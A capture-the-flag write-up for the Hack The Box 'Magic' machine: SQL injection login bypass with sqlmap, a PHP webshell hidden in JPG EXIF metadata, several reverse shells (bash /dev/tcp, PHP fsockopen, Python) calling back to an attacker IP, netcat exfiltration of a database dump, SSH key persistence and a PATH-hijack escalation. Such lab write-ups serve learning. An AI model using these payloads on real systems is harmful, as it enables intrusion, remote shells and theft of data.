# Writeup - Magic

## 1. Initial Scanning

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
```

As expected there is a SSH and web server running on the target machine.

No other open ports were spottet in a full scan (see `nmap_tcp_fullscan`).
`
## 2. Website Landing Page

The website appears to be some sort of image gallery.
All pictures show a bunch of hex numbers as subtext, which appears to be some sort of checksum.

In the footer, there is a link to a login page.
Testing some default credentials (`admin:admin`, `test:test`, etc.) yields no result.

However, this form might be SQL injectable and shows no interesting hidden form fields or other shenanigans, so let's go with that.

## 3. Breaching the login

`sqlmap` is launched against the login form to find potential SQL injections.
I equipped it with my sessions cookie so a successful injection capable of bypassing the form will be usable in my browser right away.

```bash
sqlmap -u "http://magic/login.php" --data "username=u&pw=pass" --cookie "PHPSESSID=rruhtho7bfq0qhg3bqmehd7du9"

[18:10:31] [INFO] testing connection to the target URL
[18:10:31] [INFO] testing if the target URL content is stable
[18:10:31] [INFO] target URL content is stable
[18:10:31] [INFO] testing if POST parameter 'username' is dynamic
[18:10:31] [WARNING] POST parameter 'username' does not appear to be dynamic
# --- snip for readability ---
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n
[18:10:52] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
got a 302 redirect to 'http://magic:80/upload.php'. Do you want to follow? [Y/n] 
Y
[18:11:09] [INFO] target URL appears to be UNION injectable with 3 columns
# --- snip for readability---
```

Refreshing the browser with the same sessions cookie allows access to the `upload.php` document,
which usually redirects back to `login.php` if not authenticated.
Checking the `sqlmap` output again shows that the following request is the one receiving an `HTTP/302`:

```http
POST /login.php HTTP/1.1
    Cache-control: no-cache
    Cookie: PHPSESSID=rruhtho7bfq0qhg3bqmehd7du9
    User-agent: sqlmap/1.4.5#stable (http://sqlmap.org)
    Host: magic
    Accept: */*
    Accept-encoding: gzip,deflate
    Content-type: application/x-www-form-urlencoded; charset=utf-8
    Content-length: 74
    Connection: close

    username=u%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20xhho&pw=pass
```

Another attempt to further peek into the potentially injectable parameter yields no usable results, unfortunately.

```bash
sqlmap -u "http://magic/login.php" --cookie "PHPSESSID=rruhtho7bfq0qhg3bqmehd7du9" -b --current-user --current-db --tables --schema --columns
```

As the `upload.php` document looks more promising that the data that could be extracted from the potential SQL injection,
let's postpone further exploitation of this to a later point in time, if no better options are to be found.

## 3. Tampering with Image Uploading

`upload.php` presents a simple screen allowing for selecting a file and clicking `upload`.
Clicking the button without selecting anything prompts us with an error message saying

> Sorry, only JPG, JPEG & PNG files are allowed.

to which I will refer to as `Type Error (Message)` in the following sections (it will come up again several times).

Next, check what happens, if we actually upload a picture. Uploading the `bongocat.jpg` succeeds and the picture is actually shown on the main page! Investigating the source of the picture reveals, that they are loaded from `/images/uploads/$FILENAME`.

Simply uploading a PHP file fails (as expected, honstely).

### 3.1 Hiding a PHP payload

Inspired by a **very cool** hack [I've read about a couple years ago](https://herolab.usd.de/how-to-exploit-a-vulnerable-picture-upload-using-manipulated-pictures/) the idea is to just get a PHP payload in the picture file, using the `<?php ... ?>` tags and getting the server to execute it, once the file is requested from the server. However, as the server executing any file a PHP file is unlikely, we probably have to get around some sort of upload filtering mechanism, to place a `.php` file on the server.

Fortunately, it appears that the server doesn't alter the uploaded image files, so we don't have to find out which sections aren't modified first (like in the article linked above).

I placed an PHP payload somewhere in image file (shouldn't really matter where exactly, as far as the PHP interpreter is concerned) uploaded it (`hackpic.jpg`) successfully and downloaded it again (`haxpic_downloaded.jpg`). The SHA256 hashes match:

```bash
$ sha256sum haxpic_downloaded.jpg
31796d38aecf10ab79702f14767ed30bb3c5b63e152a9488a987dab93a4c9e53

$ sha256sum hackpic.jpg
31796d38aecf10ab79702f14767ed30bb3c5b63e152a9488a987dab93a4c9e53
```

However, requesting the tampered image directly doesn't provide any output or result from the script. Tests with `sleep` indicate, that the script is not actually executed (page returns faster that the `sleep` duration).

### 3.2 Trying to fool the Filter

So it appears that we actually have to upload a `.php` file to get this to work.

As an initial test, I changed the filename using Burp, but the check is server-side, so no client-side manipulation to bypass some JavaScript.

#### 3.2.1 Multiple File Extensions

Changing the filename such that `.php` is contained but not at the end might be an option, as PHP does _NOT_ always insist on `.php` being **at the end** of the filename.

Trying to upload a file with `filename.php.jpg" returns an error saying

> What are you trying to do here?

to which I will refer to as `Tamper Error (Message)` from now on.
It indicates, that some sort of filter has blocked the upload.

Naming a PHP file with JPG extension, like `script.jpg`, yields the same `Tamper Error` as the double file extension.
Therefore, I concluded that there is filtering based on name **and** content, while just providing the _magic bytes_ for JPG `FF D8` and `FF D9` at beginning and end respectively, didn't suffice to convince the content filter (also tried concealing a PHP payload with those magic bytes).

> _**Note:** This approach later appeared to be the correct one. The sole filename did in fact NOT trigger the filter, but the contents of the file (either that or a combination of those two factors). The conclusion that `.php` in the middle of the filename triggered the filter was false.`_
>
> This was a mistake I made, as I apparently **did not** test a valid unmodified image with that filename. Otherwise I'd have noticed that the upload is successful. This flaw is used in the approach that had been successful later in time._

#### 3.2.2 Content Type Tampering

Changing the content type didn't affect uploads at all. Even uploading actual valid images with `Content-Type: text/x-php` succeeds. No filters seem to be avoidable with this technique. PHP scripts still cannot be uploaded, even if the content type is changed to one of an image format.

#### 3.2.3 Overwriting Files and Path Traversal

I noticed, that existing filenames could be used and uploaded.
This sparked the idea of using uploaded files to overwrite existing files on the file system (somehow).

Unfortunately, I wasn't able to do any sort of path traversal, by manipulating the filename attribute. Also, the website in general wasn't susceptible to basic path traversal techniques (not even directory listing in fact).

#### 3.2.4 Encoding Characters in the Filename

I tried several encoding tricks using URL encoding and hex encoding or HTML comments in the filename, as PHP deliberately decodes many of them implicitly, possibly allowing a filter to be fooled by this, if it checks the filename **before** the string is passed to some sort of PHP function that decodes it.

Over the course of those attempts, it appeared that specifically tag characters (`<` or `>`) cause them to be commented out in the response website with HTML comments. XSS might be possible by tricking this commenting function, but probably isn't useful to futher penetrate the system here.

Filenames like `<?php phpinfo(); ?>` or `%3C?php phpinfo(); ?%3E.jpg` caused an indication of success when trying an upload, but the actual images weren't available on the main page. Interestingly enough, the filenames are requested in their original form, but get a `HTTP/404` response. So the filenames seem to end up in some sort of storage. 

**If this is a database, another SQL injection could be possible. Saving that for later.**

Messing around with `NULL` byte characters, hoping that the filter would stop checking the string at an earlier point than the function writing the file to disc failed, unfortunately. Those attempts with `0x00` or `%00` just got the `Tamper Error` as response, if I tried to hide `.php` behind the `.jpg` extension and `NULL` byte, while `Type Error` was received when trying it vice versa.

Path Traversal also wasn't possible using those encoding techniques. `Tamper Error` was received on those attempts.

#### 3.2.5 SQL Injection in Filenames

Saving the upload POST request to a file and using it as template for `sqlmap` didn't yield any results, unfortunately.
Especially as encoding doesn't work to bypass the filter and the amount of usable characters is very limited, I don't think that SQL injection is the way to go here.

### 3.3 Actually Bypassing the Filter

> _**Note:** At this point, I had no idea on how to proceed. I was quite positive, that hiding a PHP payload in the image is correct approach but couldn't make is past the filter, despite exhausting techniques I knew at this point._
> 
> As next step, I looked up a hint, what my the next step could/should be. The hint was `exiftool`. It turned out, that my approach was correct and my first guess also went into the right direction. I just used the wrong tools. As this was not a matter of severe lack of skill and knowledge, I decided to go on with this machine.

My approach explained in section `3.2` and `3.2.1` was actually the right one to pursue. `exiftool` allows for manipulation of image metadata, which turned out to be the crux of breaching the upload mechanism. I knew that image metadata is a thing, but missed that it actually makes a difference in this case, where exactly the payload is placed.

I assumed that PHP code could be placed at any point in the file and pass the filter, while also being under the false assumption, that `.php` somewhere in the filename would prevent the image upload (see `3.2.1`).

#### 3.3.1 Placing the Payload and Verification 

To check if the metadata approach works, I placed a `phpinfo()` command in the `artist` field, which should yield quite some output regarding the PHP installation upon requestin the image.

```bash
$ exiftool -artist='<?php phpinfo(); ?>' inject.jpg
```

But still, only the picture was shown. Another attempt with `inject.php` as filename failed with `Type Error` just like before, as the filter also pays attention to the filename.

Coming back to my initial approach of using a double file extension, I tried uploading `inject.php.jpg`, which surprisingly (for me at that point in time, as I still had a false assumption about the filename filter) passed and was uploaded successfully.

Requesting that picture indeed presented me with a typical PHPinfo view.

### 3.4 Code Execution and actually useful Payloads

After this confirmation, I tried to get some sort of reverse shell or access, by injecting the following payloads into the image's metadata.

```bash
$ exiftool -artist='<?php system("nohup /bin/bash -i >& /dev/tcp/10.10.15.184/51337 0>&1"); ?>'
```

This basic reverse shell payload (from PentestMonkey) didn't work for some reason. I wasn't able to figure out why, but it wasn't really worth it at the moment anyway, as there are many other options to try.

```bash
exiftool -artist="<?php system('\$sock=fsockopen(\"10.10.15.184\",51337);exec(\"/bin/bash -i <&3 >&3 2>&3\");'); ?>" revshell2.php.jpg
```

Another PHP-based reverse shell (from GTFObins) which unfortunately didn't work either. However, text was returned, indicating that PHP didn't run into a breaking exception.
Changing `3` to `4` and upwards, as advised by GTFObins wasn't successful either.

As escaping all those characters correctly got pretty messy and annoying by then, I tried to build a payload, that just takes whatever it gets via GET (pun intended) in the `inject` parameter and executes it.

```bash
exiftool -artist='<?php system($_GET["inject"]); ?>' exec.php.jpg
```

This succeeds for simple commands like `sleep` or `echo`, even providing the return value for the latter, but for those reverse shells, it fails again. As last improvement, before trying out other reverse shells, I enabled error reporting for this PHP script

```bash
exiftool -artist='<?php ini_set("display_errors", 1); ini_set("display_startup_errors", 1); error_reporting(E_ALL);system($_GET["inject"]); ?>' exec.php.jpg
```

However, no error text was returned for the aforementioned commands, which leads me to believe that they don't work on OS level independent of the way they are delivered or PHP error reporting was disabled **very** carefully.

Interestingly enough, `wget` to a listener I put up locally seems to work. So there must be something wrong with the shells. At least, the machine is not blocked from connecting to anything except `localhost`.

Trying out a Python3 shell (also from [PentestMonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)) finally worked and returned a prompt to my machine, as I requested the following address:

``` bash
# Payload (line breaks for readability, works without them):
# python3 -c 'import socket,subprocess,os;
# s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
# s.connect(("10.10.15.184",51337));
# os.dup2(s.fileno(),0);
# os.dup2(s.fileno(),1);
# os.dup2(s.fileno(),2);
# p=subprocess.call(["/bin/bash","-i"]);'

# Address requested:
http://magic/images/uploads/exec.php.jpg?inject=python3%20%2Dc%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket%2Esocket%28socket%2EAF%5FINET%2Csocket%2ESOCK%5FSTREAM%29%3Bs%2Econnect%28%28%2210%2E10%2E15%2E184%22%2C51337%29%29%3Bos%2Edup2%28s%2Efileno%28%29%2C0%29%3B%20os%2Edup2%28s%2Efileno%28%29%2C1%29%3B%20os%2Edup2%28s%2Efileno%28%29%2C2%29%3Bp%3Dsubprocess%2Ecall%28%5B%22%2Fbin%2Fbash%22%2C%22%2Di%22%5D%29%3B%27
```

The user we are logged in is the webservers user (not root), which doesn't have a `HOME` directory, but there is one for a user called `theseus`. Besided that, no `user.txt` (user flag) in sight.

## 4. Breaking Userland

In the `webroot` directory from which the websites are served, there is a file called `db.php5`, which turned out to contain credentials for the database user `theseus`.

``` php
private static $dbName = 'Magic' ;
private static $dbHost = 'localhost' ;
private static $dbUsername = 'theseus';
private static $dbUserPassword = 'iamkingtheseus';
```

Hoping that the user would be identical for the OS user, I tried `su theseus`, which returned that the shell is not a tty/terminal, so I have to spawn one first using

``` bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Unfortunately, the password `iamkingtheseus` didn't work, but we still got the database to explore. `netstat -tulpn` revealed that there is one listening on port `3306` (most likely MySQL/MariaDB).

The system had no mysql client installed (command `mysql` didn't exist), but while I thought about establishing a relay using `netcat` or something, I noticed that other tools are, in fact, installed.
`mysqldump` was available, so I dumped the database using the credentials and transferred it over to my machine, in case the reverse shell breaks or the machine is reset.

``` bash
# Netcat wasn't available on the target host, so I get it from mine first
# On my (attacker) machine
$ cd /root/hackthebox/magic
$ cp /usr/bin/nc ./
$ python -m SimpleHTTPServer

# For readability, I add my listener command here.
# It is used in a moment
$ nc -v -l -p 61337 > db_dump.mysql
```

``` bash
# Back on the target system
$ mysqldump -h 127.0.0.1 -u theseus -p --all-databases > /tmp/valeera/db_dump.mysql
# Successfully dumped the database
$ nc 10.10.15.184 61337 < db_dump.mysql
```

Examining the database dump yields the admin account and password:

``` sql
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
```

Using this as password for the local `theseus` account on the system grants access. The users `HOME` directory `/home/theseus` reveals the user flag for this machine.

### 4.1 Maintaining Access

To log in with a proper shell, I placed my SSH public key in `/home/theseus/.ssh/authorized_keys`, as the previous method involved multiple sub-shells and I wouldn't consider it very stable.

At the same time, I noticed that the `/tmp` directory for `theseus` isn't identical to the view the `www-data` user gets on it, so the latter (or PHP generally?) seem to run in some sort of restricted environment. At least, my files placed there from the previous PHP-based shell were gone, when switching to `theseus`.

## 5. (Not) Breaking `root`

First, get an overview of the system using `LinEnum`

``` bash
# My host
$ nc -v -l -p 61337 < ~/hackthebox/tools/LinEnum/LinEnum.sh
$ nc -v -l -p 61338 > linenum.log

# Target host
$ nc 10.10.15.184 61337 > linenum.sh
$ chmod +x linenum.sh
$ ./linenum.sh > linenum.log
$ nc 10.10.15.184 61338 < linenum.log
```

After taking a close look to the `SUID/SGID` binaries, installed software, users, cronjobs, `theseus`'s directory, the web root, `/opt`, `update-motd.d` (as learned in the `traceback` challenge), `.bash_history` (which was a symlink to `/dev/null`, good job `jkr`), `systemd` jobs and so many other things, I had not a single clue on how to proceed. Continuing a day later sparked no new ideas.

> At that point, I decided to give up on the challenge,
> as I wasn't able to find a single trace of what to do next.
> However, as I'm always interested in what I missed,
> so I acquired a write-up of the challenge.
> 
> Of course, I decided to **not claim the `root.txt` root flag** using that knowledge,
> as I had no reasonable chance of finding the flag myself,
> even if I had used a lot more time to investigate the system.

## 6. Really Breaking `root`

The solution for escalating to `root` lies in the `SUID` executable `/bin/sysinfo`, which was buried between dozens of other executables found in `/bin/`.

If I had seen it, I would've overlooked its importance, because the name itself sound pretty "default" for an operating system. However, **it isn't**.

Executing this thing grants an overview of several system-related information (hardware, etc.). A very keen eye notices that the output contains the output of a tool called `lshw` which is actually legitimate.

But as `sysinfo` is written by a user of this system, it's an interesting target and indeed contains a flaw.

`lshw` is called relatively, without using an exlicit absolute path.
This allows for the user to alter their own `PATH` variable, prepend a directory containing an executable named `lshw` and then executing `sysinfo`.

This causes `sysinfo` to execute the user-controlled `lshw` executable as `root` (due to `SUID` being set for `sysinfo`). As `lshw` is user-controlled, the user can insert arbitrary code and let `sysinfo` execute it as `root`, possibly granting a shell as `root` or dumping `/root/root.txt` straight away (where the root flag is usually stored).

## 7. Summary

I was able to get into userland and get the `user.txt` flag, after a light bump into the right direction.
That bump was to use `exiftool` to store executable script code in JPG metadata, instead of dumping the code in the middle of the picture.

For content, it seems that the picture has to a valid JPG. Just having the magic bytes `FF D8` and `FF D9` wasn't sufficient to fool the filter.

**However, I couldn't obtain `root` access.**
The solution, according to a write-up, lies within an executable `/bin/sysinfo` which is custom and usually not part of the operating system.
It invokes `lshw` relatively, which allows for a PATH-hijack attack.

**_As I wouldn't have found that thing on my own and haven't had the knowledge to identify thing executable as not pre-installed,
I haven't claimed the root flag._**

## 8. Lessons Learned

`exiftool` comes in very handy when manipulating media files,
especially for images in this case.

Also, never change multiple things when exploring a filter.
This led me to a false assumption about the filter for filenames.

In addition, I looked up a tool that is able to identify unusual
(i.e. user defined and especially SUID) executables to identify
attack surface quickly. Nothing too obvious came up, 
so I'll probably create a couple Docker containers of usual Linux distros and
popular software, enumerating all files in 
`/bin/`, `/sbin/`, `/usr/bin/`, `/usr/sbin/`, `/usr/local/sbin/` and `/usr/local/bin/`.

Using that list, it should be easy to find executables, that were created by some user or server admin, even if they are stored in one of the above directories, as they are pretty messy and filled with several dozens or files.